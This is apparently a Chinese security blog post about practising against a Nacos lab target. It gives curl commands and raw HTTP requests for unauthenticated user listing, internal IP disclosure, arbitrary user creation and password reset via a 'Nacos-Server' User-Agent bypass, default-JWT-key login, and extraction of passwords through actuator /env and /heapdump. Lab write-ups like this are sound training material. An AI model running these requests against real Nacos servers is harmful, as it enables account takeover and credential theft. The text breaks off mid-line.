    <content type="html"><![CDATA[<h1 id="基本信息"><a class="markdownIt-Anchor" href="#基本信息"></a> 基本信息</h1><p>使用的是在线靶场：<a href="https://hack.zkaq.cn/battle/target?id=1496966ab0f410bd">https://hack.zkaq.cn/battle/target?id=1496966ab0f410bd</a></p><p>这个靶场是2020的，漏洞差不多也是那个时候吧。根据大佬的提示，看能不能通过这个靶场练习一下：</p><ol><li>探测hessian版本、nacos版本</li><li>能否拉出依赖</li></ol><p>开始之前，还是得看一下官方文档。</p><h2 id="nacos"><a class="markdownIt-Anchor" href="#nacos"></a> Nacos</h2><p><code>Nacos /nɑ:kəʊs/ </code> 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</p><p>Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。</p><p>Nacos 帮助您更敏捷和容易地构建、交付和管理微服务平台。 Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。</p><p>参考：<a href="https://nacos.io/zh-cn/docs/what-is-nacos.html">https://nacos.io/zh-cn/docs/what-is-nacos.html</a></p><h2 id="鉴权"><a class="markdownIt-Anchor" href="#鉴权"></a> <a href="https://nacos.io/zh-cn/docs/auth.html">鉴权</a></h2><p>总结有几点：</p><ol><li><p>非docker安装默认关闭鉴权，打开配置<code>application.properties</code>如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">### If turn on auth system:</span><br><span class="line">nacos.core.auth.enabled=false</span><br><span class="line"></span><br><span class="line">### If turn on auth system:</span><br><span class="line">nacos.core.auth.system.type=nacos</span><br><span class="line">nacos.core.auth.enabled=true</span><br></pre></td></tr></table></figure></li><li><p>开启鉴权后，配置<code>application.properties</code>默认密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### The default token(Base64 String):</span><br><span class="line">nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789</span><br></pre></td></tr></table></figure><p>自定义密钥时，推荐将配置项设置为<strong>Base64编码</strong>的字符串，<strong>注意</strong>：鉴权开关是修改之后立马生效的，不需要重启服务端。</p></li><li><p>鉴权采用JWT token，弱用户名密码：nacos/nacos</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &#x27;127.0.0.1:8848/nacos/v1/auth/login&#x27; -d &#x27;username=nacos&amp;password=nacos&#x27;</span><br><span class="line"># Success！</span><br><span class="line">&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYwNTYyOTE2Nn0.2TogGhhr11_vLEjqKko1HJHUJEmsPuCxkur-CfNojDo&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true&#125;</span><br><span class="line"># 随后操作配置需要带上accessToken</span><br><span class="line">curl -X GET &#x27;127.0.0.1:8848/nacos/v1/cs/configs?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYwNTYyMzkyM30.O-s2yWfDSUZ7Svd3Vs7jy9tsfDNHs1SuebJB4KlNY8Q&amp;dataId=nacos.example.1&amp;group=nacos_group&#x27;</span><br></pre></td></tr></table></figure></li></ol><h2 id="api调用"><a class="markdownIt-Anchor" href="#api调用"></a> <a href="https://nacos.io/zh-cn/docs/open-api.html">API调用</a></h2><ol><li><p>配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.example&amp;group=com.alibaba.nacos&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>查询配置历史版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/cs/history?search=accurate&amp;dataId=nacos.example&amp;group=com.alibaba.nacos&#x27;</span></span><br></pre></td></tr></table></figure><p>至于详情/上一个版本的配置信息，则需要提供更多的信息</p></li><li><p>服务发现/实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/ns/instance?port=8848&amp;healthy=true&amp;ip=11.11.11.11&amp;weight=1.0&amp;serviceName=nacos.test.3&amp;encoding=GBK&amp;namespaceId=n1&#x27;</span></span><br><span class="line"><span class="comment"># 列表</span></span><br><span class="line">curl -X GET <span class="string">&#x27;127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=nacos.test.1&#x27;</span></span><br><span class="line"><span class="comment"># 实情</span></span><br><span class="line">curl -X GET <span class="string">&#x27;127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.test.2&amp;ip=10.10.10.10&amp;port=8888&amp;cluster=DEFAULT&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>查询服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;127.0.0.1:8848/nacos/v1/ns/service?serviceName=nacos.test.2&#x27;</span></span><br><span class="line"><span class="comment"># 列表</span></span><br><span class="line">curl -X GET <span class="string">&#x27;127.0.0.1:8848/nacos/v1/ns/service/list?pageNo=1&amp;pageSize=2&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>查询命名空间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://localhost:8848/nacos/v1/console/namespaces&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="历史漏洞"><a class="markdownIt-Anchor" href="#历史漏洞"></a> 历史漏洞</h2><h3 id="信息泄漏"><a class="markdownIt-Anchor" href="#信息泄漏"></a> 信息泄漏</h3><p>未登录，访问URL，可以获得默认安装后泄漏的内网IP地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8848/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageS%20ize=10&amp;keyword</span><br></pre></td></tr></table></figure><p>未登录，访问URL，可以获得默认安装后的用户列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8848/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9</span><br></pre></td></tr></table></figure><h3 id="任意用户创建"><a class="markdownIt-Anchor" href="#任意用户创建"></a> 任意用户创建</h3><p>访问<code>http://your-ip:8848/nacos/v1/auth/users</code>。利用POST传参，此处的参数为<code>username=test&amp;password=test</code>，修改<code>User-Agent</code>头为<code>Nacos-Server</code>。发送POST请求，返回码200，成功创建test用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://192.168.244.123:8848/nacos/v1/auth/users?username=test1&amp;password=test1</span></span><br></pre></td></tr></table></figure><h3 id="任意用户密码更改"><a class="markdownIt-Anchor" href="#任意用户密码更改"></a> 任意用户密码更改</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&#x27;http://your-ip:8848/nacos/v1/auth/users?accessToken=&#x27;</span> -H <span class="string">&#x27;User-Agent:Nacos-Server&#x27;</span> -d <span class="string">&#x27;username=test1&amp;newPassword=test2&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="后台未授权登录"><a class="markdownIt-Anchor" href="#后台未授权登录"></a> 后台未授权登录</h3><p>漏洞主要由于NACOS使用了默认的JWT key导致的未授权访问漏洞。通过该漏洞，攻击者可以绕过用户名和密码验证直接登录到nacos用户后台。</p><p>poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200</span><br><span class="line">Server: nginx/1.19.6</span><br><span class="line">Date: Sun, 11 Apr 2021 01:48:17 GMT</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Origin</span><br><span class="line">Vary: Access-Control-Request-Method</span><br><span class="line">Vary: Access-Control-Request-Headers</span><br><span class="line">Access-Control-Allow-Origin: http://47.93.46.78:9090</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA</span><br><span class="line">Content-Length: 162</span><br><span class="line"></span><br><span class="line">&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发送这个包过去即可</p><h3 id="使用spring-boot获得账号密码"><a class="markdownIt-Anchor" href="#使用spring-boot获得账号密码"></a> 使用Spring Boot获得账号密码</h3><p>参考：<a href="https://blog.csdn.net/qq_45161658/article/details/122848419">https://blog.csdn.net/qq_45161658/article/details/122848419</a></p><h3 id="反序列化漏洞"><a class="markdownIt-Anchor" href="#反序列化漏洞"></a> 反序列化漏洞</h3><p>影响版本</p><ul><li>1.4.0 &lt;= Nacos &lt; 1.4.6</li><li>2.0.0 &lt;= Nacos &lt; 2.2.3</li></ul><p>参考：</p><ul><li><a href="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian反序列化漏洞分析/</a></li><li><a href="https://www.freebuf.com/vuls/224280.html">https://www.freebuf.com/vuls/224280.html</a></li></ul><p>只能打一次，与协议有关，需要探测hessian版本，拉出依赖。</p><h2 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h2><p>在1.2~1.4.0版本期间，通过User-Agent中是否包含Nacos-Server来进行判断请求是否来自其他服务端，UA头中包含Nacos-Server就可以通过认证访问需要鉴权的接口。所以第一个就是获取其版本。</p><p>从1.4.1版本开始，Nacos添加服务身份识别功能，用户可以自行配置服务端的Identity，不再使用User-Agent作为服务端请求的判断标准。</p><p>配置文件中JWT默认key上面说到了。可以使用JWT章节介绍的来延长JWT过期时间。</p><h3 id="开启auth的汇总"><a class="markdownIt-Anchor" href="#开启auth的汇总"></a> 开启auth的汇总</h3><p><strong>UA头中包含Nacos-Server</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&quot; -H &quot;User-Agent: Nacos-Server&quot;</span><br></pre></td></tr></table></figure><p><strong>默认自定义身份识别标志</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&quot; -H &quot;serverIdentity: security&quot;</span><br></pre></td></tr></table></figure><p><strong>账户信息 JWT accessToken</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&amp;username=nacos&amp;password=nacos&quot;</span><br></pre></td></tr></table></figure><p><strong>accessToken</strong></p><p>利用Authorization登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users/login&quot;  -X POST -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTk5NTQzODEyOH0.KSFTu7Cwi3ofgclAFImctUHZERZj6WavjlH37db1FTY&quot; -d &quot;username=nacos&amp;password=1&quot;</span><br></pre></td></tr></table></figure><h1 id="实践"><a class="markdownIt-Anchor" href="#实践"></a> 实践</h1><h2 id="nacos版本-敏感信息"><a class="markdownIt-Anchor" href="#nacos版本-敏感信息"></a> nacos版本、敏感信息</h2><p>呵呵哈哈哈，狂点登录窗口的左上角标志，一直点，可能会偶然进入后台（闪现），就可以看到版本了，呵呵哈哈哈，闪了一下他就退出了。</p><h3 id="版本信息"><a class="markdownIt-Anchor" href="#版本信息"></a> 版本信息</h3><blockquote><p>META-INF, 相当于一个信息包，用于存放一些meta information相关的文件。用来配置应用程序、扩展程序、<a href="https://so.csdn.net/so/search?q=%E7%B1%BB%E5%8A%A0%E8%BD%BD&amp;spm=1001.2101.3001.7020">类加载</a>器和服务<a href="https://www.baidu.com/s?wd=manifest.mf&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao">manifest.mf</a>文件，在用jar打包时自动生成。</p></blockquote><p>在使用<code>/env</code>接口获取环境列表后，搜索：<code>META-INF</code>或者<code>BOOT-INF</code>可以看到：</p><p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627123130665.png" alt="image-20230627123130665" /></p><p>如果搜索：version，就会有：参考：<a href="https://www.cnblogs.com/allenwas3/p/12145524.html">https://www.cnblogs.com/allenwas3/p/12145524.html</a></p><p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627123400166.png" alt="image-20230627123400166" /></p><p>那是不是就不可以获取了？</p><h3 id="env接口获取环境列表并使用heapdump下载查看关键信息"><a class="markdownIt-Anchor" href="#env接口获取环境列表并使用heapdump下载查看关键信息"></a> <code>/env</code>接口获取环境列表，并使用<code>/heapdump</code>下载查看关键信息</h3><p>使用dirsearch可以看到一些未授权接口：<code>dirseach.py -u &lt;ip:port&gt; -r</code>。重要的信息泄漏有：<code>/env</code>和<code>/heapdump</code>接口。</p><blockquote><p>/env接口：会生成应用程序可用的所有环境属性的列表，无论这些属性是否用到。这其中包括环境变量、JVM 属性、命令行参数，以及 application.properties 或 application.yml 文件提供的属性。</p><p>/heapdump接口：当访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret、key等)的属性名对应的属性值用 * 号替换达到脱敏的效果。而此时若是想要找到想要获取的被星号 * 遮掩的属性值对应的属性名可以通过下载heapdump 文件从其中获取信息。heapdump是系统自动生成一个 Jvm 的堆文件，该文件保存了某一时刻JVM堆中对象使用情况，也可能包含着一些密码属性，通过对该文件进行解读可以从获取到nacos的密码。使用<a href="http://www.eclipse.org/mat/downloads.php">MemoryAnalyzer</a>内存查看工具</p></blockquote><p>url访问：<code>http://glkb-qkj2.aqlab.cn/nacos/actuator/env</code></p><p>或者使用curl：<code>curl -X GET 'http://glkb-qkj2.aqlab.cn/nacos/actuator/env'</code></p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627110021514.png" alt="image-20230627110021514" style="zoom:67%;" /><p>看到这里面有密码，访问：</p><p>url访问：<code>http://glkb-qkj2.aqlab.cn/nacos/actuator/heapdump</code></p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627113710829.png" alt="image-20230627113710829" style="zoom:67%;" /><p>放到MemoryAnalyzer中看：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).<span class="keyword">contains</span>(&quot;password&quot;))</span><br></pre></td></tr></table></figure><p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627122418408.png" alt="image-20230627122418408" /></p><h3 id="尝试获得内网ip"><a class="markdownIt-Anchor" href="#尝试获得内网ip"></a> 尝试获得内网IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://glkb-qkj2.aqlab.cn/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageS%20ize=10&amp;keyword&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:200,<span class="string">&quot;message&quot;</span>:null,<span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;10.0.0.53&quot;</span>,<span class="string">&quot;port&quot;</span>:8848,<span class="string">&quot;state&quot;</span>:<span class="string">&quot;UP&quot;</span>,<span class="string">&quot;extendInfo&quot;</span>:&#123;<span class="string">&quot;adWeight&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;lastRefreshTime&quot;</span>:1685783927892,<span class="string">&quot;raftMetaData&quot;</span>:&#123;<span class="string">&quot;metaDataMap&quot;</span>:&#123;<span class="string">&quot;naming_instance_metadata&quot;</span>:&#123;<span class="string">&quot;leader&quot;</span>:<span class="string">&quot;10.0.0.53:7848&quot;</span>,<span class="string">&quot;raftGroupMember&quot;</span>:[<span class="string">&quot;10.0.0.53:7848&quot;</span>],<span class="string">&quot;term&quot;</span>:1&#125;,<span class="string">&quot;naming_service_metadata&quot;</span>:&#123;<span class="string">&quot;leader&quot;</span>:<span class="string">&quot;10.0.0.53:7848&quot;</span>,<span class="string">&quot;raftGroupMember&quot;</span>:[<span class="string">&quot;10.0.0.53:7848&quot;</span>],<span class="string">&quot;term&quot;</span>:1&#125;&#125;&#125;,<span class="string">&quot;raftPort&quot;</span>:<span class="string">&quot;7848&quot;</span>,<span class="string">&quot;remoteConnectType&quot;</span>:<span class="string">&quot;GRPC&quot;</span>,<span class="string">&quot;site&quot;</span>:<span class="string">&quot;unknow&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;2.0.0-ALPHA.1&quot;</span>,<span class="string">&quot;weight&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,<span class="string">&quot;address&quot;</span>:<span class="string">&quot;10.0.0.53:8848&quot;</span>,<span class="string">&quot;failAccessCnt&quot;</span>:0&#125;]&#125;</span><br></pre></td></tr></table></figure><h3 id="默认安装后泄漏的用户列表"><a class="markdownIt-Anchor" href="#默认安装后泄漏的用户列表"></a> 默认安装后泄漏的用户列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://glkb-qkj2.aqlab.cn/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;totalCount&quot;</span>:1,<span class="string">&quot;pageNumber&quot;</span>:1,<span class="string">&quot;pagesAvailable&quot;</span>:1,<span class="string">&quot;pageItems&quot;</span>:[&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;nacos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;$2a$10<span class="variable">$B3Y43jNaOC3Ie4gRg</span>/ZqpeRl1AGA.ZRpWxB1Lz3RnLb4XM6coVooa&quot;</span>&#125;]&#125; </span><br></pre></td></tr></table></figure><h2 id="鉴权-2"><a class="markdownIt-Anchor" href="#鉴权-2"></a> 鉴权</h2><h3 id="未授权登录"><a class="markdownIt-Anchor" href="#未授权登录"></a> 未授权登录</h3><p>操作：</p><ol><li><p>打开登录页面，随便输入帐号密码，抓包，右击，do intercept，截获返回的数据包，点击forward</p><p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627111957167.png" alt="image-20230627111957167" /></p></li><li><p>得到结果：</p><p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627112246712.png" alt="image-20230627112246712" /></p></li><li><p>删除这个框的内容，加上上面的POC，发送即可成功登录。</p></li></ol><h3 id="任意创建用户"><a class="markdownIt-Anchor" href="#任意创建用户"></a> 任意创建用户</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/nacos/v1/auth/users</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ip:8848</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Nacos-Server</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-bash">username=<span class="built_in">test</span>&amp;password=<span class="built_in">test</span></span></span><br></pre></td></tr></table></figure><p>使用apipost发送一下。</p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230626211035143.png" alt="image-20230626211035143" style="zoom:67%;" /><p>然而登录进去就有flag</p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230626211307630.png" alt="image-20230626211307630" style="zoom:67%;" /><h3 id="更改用户"><a class="markdownIt-Anchor" href="#更改用户"></a> 更改用户</h3><p>注意data中的键是newPassword，提交方式是PUT</p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230626212116273.png" alt="image-20230626212116273" style="zoom:67%;" /><h2 id="获取服务信息版本集群列表"><a class="markdownIt-Anchor" href="#获取服务信息版本集群列表"></a> 获取服务信息/版本/集群列表/</h2><p>根据上面的api接口，尝试一下。</p><p>查看存在的server，这里走list。</p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230626213550278.png" alt="image-20230626213550278" style="zoom:67%;" /><p>其实这算是成功了，靶机里面没啥服务，所以没探出来。</p><p>查看存在的Servlet集群，路径是：<code>/nacos/v1/ns/operator/servers</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;servers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.0.53&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8848</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UP&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;extendInfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;adWeight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;lastRefreshTime&quot;</span><span class="punctuation">:</span> <span class="number">1685783927892</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;raftMetaData&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;metaDataMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;naming_instance_metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;leader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.0.53:7848&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;raftGroupMember&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;10.0.0.53:7848&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;term&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;naming_service_metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;leader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.0.53:7848&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;raftGroupMember&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;10.0.0.53:7848&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;term&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;raftPort&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7848&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;remoteConnectType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GRPC&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;site&quot;</span><span class="punctuation">:</span> <span class="string">&quot;unknow&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0-ALPHA.1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;weight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.0.53:8848&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;failAccessCnt&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>另外，访问集群Leader：<code>/nacos/v1/ns/raft/leader</code>，这个不测了</p><p>测命名空间：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http<span class="punctuation">:</span><span class="comment">//glkb-qkj2.aqlab.cn/nacos/v1/console/namespaces</span></span><br><span class="line"># or</span><br><span class="line">http<span 